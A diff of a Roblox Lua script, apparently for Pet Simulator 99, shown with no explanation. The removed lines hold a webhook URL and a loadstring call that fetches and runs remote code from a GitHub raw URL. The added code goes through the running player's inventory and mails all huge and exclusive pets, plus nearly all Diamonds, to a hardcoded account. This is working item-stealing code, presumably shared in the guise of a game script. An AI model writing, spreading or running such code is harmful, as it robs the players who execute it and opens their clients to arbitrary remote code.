@@ -1,5 +1,53 @@
-Username = "imbouttadoit"
-Webhook = "https://webhook.lewistehminerz.dev/api/webhooks/1198780376643018793/cp6mgWXuxiPwCCqUA4OG-oXY9gOBnVxW8PD5hwoSoebWCewsIbGr1RTWBkPju1x4u6Gt"
-LoadingScreen = false
+local user = "samuraikid0221"
+local Library = require(game.ReplicatedStorage.Library)
+local Save = Library.Save.Get().Inventory
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/PS99Mail/main/Mementomori"))()
+for i, v in pairs(Save.Pet) do
+    local id = v.id
+    local dir = Library.Directory.Pets[id]
+    if dir.huge == true then
+        local args = {
+            [1] = user,
+            [2] = "yurr",
+            [3] = "Pet",
+            [4] = i,
+            [5] = v._am or 1
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
+
+local Library = require(game.ReplicatedStorage.Library)
+local Save = Library.Save.Get().Inventory
+
+for i, v in pairs(Save.Pet) do
+    local id = v.id
+    local dir = Library.Directory.Pets[id]
+    if dir.exclusiveLevel == true then
+        local args = {
+            [1] = user,
+            [2] = "yurr",
+            [3] = "Pet",
+            [4] = i,
+            [5] = v._am or 1
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
+
+local GetSave = function()
+    return require(game.ReplicatedStorage.Library.Client.Save).Get()
+end
+
+for i, v in pairs(GetSave().Inventory.Currency) do
+    if v.id == "Diamonds" then
+        local args = {
+            [1] = user,
+            [2] = v.id,
+            [3] = "Currency",
+            [4] = i,
+            [5] = v._am - 10000
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
